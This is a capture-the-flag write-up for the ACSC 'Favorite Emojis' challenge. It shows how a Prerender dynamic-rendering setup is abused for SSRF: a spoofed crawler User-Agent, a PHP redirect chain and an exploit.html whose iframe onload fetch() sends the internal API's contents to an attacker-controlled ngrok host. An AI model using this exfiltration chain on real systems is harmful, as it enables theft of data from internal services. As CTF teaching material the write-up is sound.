---
description: Prerender dynamic rendering leads to SSRF
---

# Favorite Emojis

## Description

🎈





&#x20;                               🏃

`http://favorite-emojis.chal.acsc.asia:5000`

{% file src="../../.gitbook/assets/favorite-emojis.tar.gz_88c58c7d867bcad99c40a2013cc77a58.gz" %}
Challenge Files
{% endfile %}

## Solution

The server uses something called dynamic rendering, which renders JavaScript on the server-side before serving web crawlers. This is meant to improve SEO.

If we look at the Nginx configuration, we can see that as long as we set our HTTP `User-Agent` header to one of the web crawlers, e.g.`googlebot`, the request is re-written and forwarded to the pre-renderer at `http://renderer:3000`.

```
location / {
    try_files $uri @prerender;
}

...

location @prerender {
    proxy_set_header X-Prerender-Token YOUR_TOKEN;
    
    set $prerender 0;
    if ($http_user_agent ~* "googlebot|bingbot|yandex|baiduspider|twitterbot|facebookexternalhit|rogerbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest\/0\.|pinterestbot|slackbot|vkShare|W3C_Validator|whatsapp") {
        set $prerender 1;
    }
    if ($args ~ "_escaped_fragment_") {
        set $prerender 1;
    }
    if ($http_user_agent ~ "Prerender") {
        set $prerender 0;
    }
    if ($uri ~* "\.(js|css|xml|less|png|jpg|jpeg|gif|pdf|doc|txt|ico|rss|zip|mp3|rar|exe|wmv|doc|avi|ppt|mpg|mpeg|tif|wav|mov|psd|ai|xls|mp4|m4a|swf|dat|dmg|iso|flv|m4v|torrent|ttf|woff|svg|eot)") {
        set $prerender 0;
    }

    if ($prerender = 1) {
        rewrite .* /$scheme://$host$request_uri? break;
        proxy_pass http://renderer:3000;
    }
    if ($prerender = 0) {
        rewrite .* /index.html break;
    }
}
```

The goal is to get to `http://api:8000/`.

```python
@app.route("/", methods=["GET"])
def root():
    return FLAG
```

If the API server was hosted on port 80 instead, there would be no need for any exploitation - the need for subsequent exploitation stems from the fact that `$host` will strip the port number in the HTTP `Host` header, preventing us from accessing the API server at port 8000 directly.

I came across [this post](https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/) which gave me the inspiration for the exploit. We know that the server uses [Prerender](https://github.com/tvanro/prerender-alpine) to handle these requests. Since Prerender uses Chrome to render JavaScript, we can perform XSS within the renderer.

Set the host header so that the renderer visits our attacker-controlled site. From there, we can redirect the browser using the `Location` header.

`redirect.php`:

```php
<?php 
    header("Location: http://localhost:3000/render?url=http://localhost:3000/render?url=http://0db7-115-66-195-39.ngrok.io/exploit.html");
?>
```

From the user's perspective, the Nginx server will return the 302 redirect, instead of the contents of the redirected site. However, the renderer's browser will still follow the redirect. It will then be redirected to our second exploit page:

`exploit.html`:

```markup
<html>
    <body>
        <iframe id="iframe" src="http://localhost:3000/render?url=http://api:8000/" onload='fetch("http://0db7-115-66-195-39.ngrok.io/?"+btoa(document.getElementById("iframe").contentWindow.document.documentElement.innerHTML));'></iframe>
    </body>
</html>
```

Notice that the browser is currently on `http://localhost:3000`, viewing the pre-rendered `exploit.html`. Since both the current site and the iframe's source are `http://localhost:3000`, this bypasses SOP and allows us to access the iframe's contents through the `onload` handler.

This gives us the `http://api:8000/` contents:

```
[Sat Sep 18 19:36:42 2021] 127.0.0.1:49207 [404]: /?PGhlYWQ+PC9oZWFkPjxib2R5PkFDU0N7c2hhcmtzX2FyZV9hbHdheXNfaHVuZ3J5fTwvYm9keT4= - No such file or directory
```

Which decodes to

```markup
<head></head><body>ACSC{sharks_are_always_hungry}</body>
```
